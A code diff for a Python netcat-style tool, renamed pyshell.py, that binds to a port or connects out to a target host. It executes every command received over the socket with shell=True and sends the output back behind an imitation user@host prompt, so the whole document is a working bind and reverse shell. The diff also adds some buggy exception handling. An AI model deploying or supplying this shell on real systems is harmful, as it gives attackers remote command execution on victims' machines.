@@ -16,7 +16,7 @@ port = 0
 
 def usage():
 
-    print("Usage: PyCat.py -t target_host -p port")
+    print("Usage: pyshell.py -t target_host -p port")
 
     print("-h --help")
     print("Display this help message")
@@ -30,6 +30,9 @@ def usage():
     print("-e --execute=file_to_run")
     print("Execute file upon connection")
 
+    print("-t --target=host")
+    print("Host for the ibound connection")
+
     sys.exit(0)
 
 
@@ -37,48 +40,71 @@ def exec_command(command, exe):
     command = command.rstrip()
 
     try:
-        if exe == 'cmd' or 'cmd.exe' in exe or exe == '/bin/bash' or exe == '/bin/sh':
+        if exe == 'cmd' or 'cmd.exe' in exe or exe == '/bin/bash':
             out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)+'\n'.encode()
         else:
             out = subprocess.check_output([exe, command], stderr=subprocess.STDOUT, shell=True)+'\n'.encode()
-            
-    except subprocess.CalledProcessError:
-        out = ("'%s' command not found" % command).encode()+'\n'.encode()
 
+    except subprocess.CalledProcessError:
+        out = b"'%s' command not found \n" % command.encode()
     return out
 
 
 def client_handler(client_socket, execute):
     if len(execute):
-        if execute != 'cmd' and execute != 'cmd.exe' and execute != '/bin/bash' and execute != 'powershell.exe' and execute != '/bin/sh':
-            client_socket.send("Cmd line: ".encode())
+        if sys.platform == 'win32':
+            client_socket.send(os.getcwd().encode() + b'>')
         else:
-            client_socket.send("<Shell:#> ".encode())
+            loc = os.getcwd().split('/')
+            if loc[1] == 'root':
+                usr = 'root'
+            else:
+                usr = loc[2]
+                client_socket.send(('%s@%s:%s#' % (usr, socket.gethostname(), os.getcwd())).encode())
+
         while 1:
-            try:                    
+            try:
                 cmd_buffer = client_socket.recv(1024)
 
                 _str = cmd_buffer.decode()
                 if not len(_str):
-                    out = '\n'.encode()
+                    out = b'\n'
                 else:
-                    out = exec_command(_str, execute)
+                    if _str[:2] == 'cd' and len(_str) != 2:
+                        os.chdir(_str[3:])
+                        out = b'\n'
+                    elif _str[:2] == 'cd' and sys.platform != 'win32':
+                        oloc = ''
+                        aloc = os.getcwd().split('/')
+                        i = 0
+                        while i < 3:
+                            oloc += aloc[i]+'/'
+                            i += 1
+                        os.chdir(oloc)
+                        out = b'\n'
+                    else:
+                        out = exec_command(_str, execute)
 
-                if execute != 'cmd' and execute != 'cmd.exe' and execute != '/bin/bash' and execute != 'powershell.exe' and execute != '/bin/sh':
-                    client_socket.send(out + "Cmd line: ".encode())
+                if sys.platform == 'win32':
+                    client_socket.send(out + os.getcwd().encode() + b'>')
                 else:
-                    client_socket.send(out + "<Shell:#> ".encode())
+                    loc = os.getcwd().split('/')
+                    if loc[1] == 'root':
+                        usr = 'root'
+                    else:
+                        usr = loc[2]
+                    client_socket.send(out + ('%s@%s:%s#' % (usr, socket.gethostname(), os.getcwd())).encode())
 
             except ConnectionRefusedError or ConnectionResetError:
                 print('Connection closed')
                 quit()
-            
+
 
     else:
         while True:
             try:
                 data = client_socket.recv(1024)
-            
+
                 buffer = input(data.decode())
                 if not len(buffer):
                     buffer = '\n'
@@ -95,7 +121,7 @@ def client_send(target, port, exe):
 
         print('(UNKNOWN) [%s] %s : connection successfully' % (target, port))
 
-        try: 
+        try:
             client_thread = threading.Thread(target=client_handler, args=(client, exe))
             client_thread.start()
         except KeyboardInterrupt:
@@ -121,10 +147,10 @@ def server_loop(port, up, target, exe):
 
         print('(UNKNOWN) [%s] %s : connection successfully' % (addr[0], addr[1]))
 
-        try: 
+        try:
             client_thread = threading.Thread(target=client_handler, args=(client_socket, exe))
             client_thread.start()
-            
+
         except KeyboardInterrupt:
             print('^C')
             quit()
@@ -171,4 +197,3 @@ def main():
         server_loop(port, execute, target, execute)
 
 main()
-
